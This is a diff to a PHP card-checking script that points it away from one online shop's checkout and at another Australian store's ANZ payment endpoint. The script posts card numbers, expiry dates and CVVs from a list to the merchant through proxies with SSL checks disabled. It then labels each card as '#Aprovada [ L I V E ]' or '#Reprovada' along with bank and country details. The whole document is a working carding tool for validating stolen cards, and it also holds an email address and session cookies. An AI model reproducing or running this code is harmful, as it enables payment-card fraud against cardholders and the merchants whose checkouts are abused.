@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-// If(strlen($ano) > 2)
-// {
-//   $ano = substr($ano,2,2);
-// }
+If(strlen($ano) > 2)
+{
+  $ano = substr($ano,2,2);
+}
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://ginginanddry.net.au/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://www.citytechnology.com.au/store/index.php?route=payment/anz/send');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -234,19 +234,20 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: wpfront-notification-bar-landingpage=1; wp_woocommerce_session_8e83faf0a70e323ccef66f6553c0c86a=c1487aa6aff94ee52205600e77733658%7C%7C1594203829%7C%7C1594200229%7C%7C8bb4b29f44723f4ac5cd7fd0e66aa134; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp_user_email=pubgkittu%40gmail.com; mailchimp_landing_site=https%3A%2F%2Fginginanddry.net.au%2F%3Fwc-ajax%3Dget_refreshed_fragments; woocommerce_items_in_cart=1; woocommerce_cart_hash=f28c1e0ea58d981659c5977932f912fc',
-'origin: https://ginginanddry.net.au',
-'referer: https://ginginanddry.net.au/checkout-2/',
+'Accept: application/json, text/javascript, */*; q=0.01',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: application/x-www-form-urlencoded',
+'Cookie: display=list; PHPSESSID=b94bd6f1b55120302e991e902339caee; language=en; currency=AUD',
+'Host: www.citytechnology.com.au',
+'Origin: https://www.citytechnology.com.au',
+'Referer: https://www.citytechnology.com.au/store/index.php?route=checkout/checkout',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A2-1&payment_method=migs&migs_card_number='.$cc.'&migs_card_expiration_month='.$mes.'&migs_card_expiration_year='.$ano.'&migs_card_csc='.$cvv.'&woocommerce-process-checkout-nonce=443b418103&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'vpc_CardNum='.$cc.'&selMonth='.$mes.'&selYear='.$ano.'&vpc_CardSecurityCode='.$cvv.'');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -256,14 +257,14 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment error: ','\t\t<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-// // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"result":"success"')){
+// // /////////////////////// RESULT ////////////////////////////////////
+if(strpos($result,'"success"')){
 // updatecart();
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
@@ -275,7 +276,7 @@ elseif(strpos($result,'Not Acceptable!')) {
 
 else {
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
   }
 curl_close($curl);
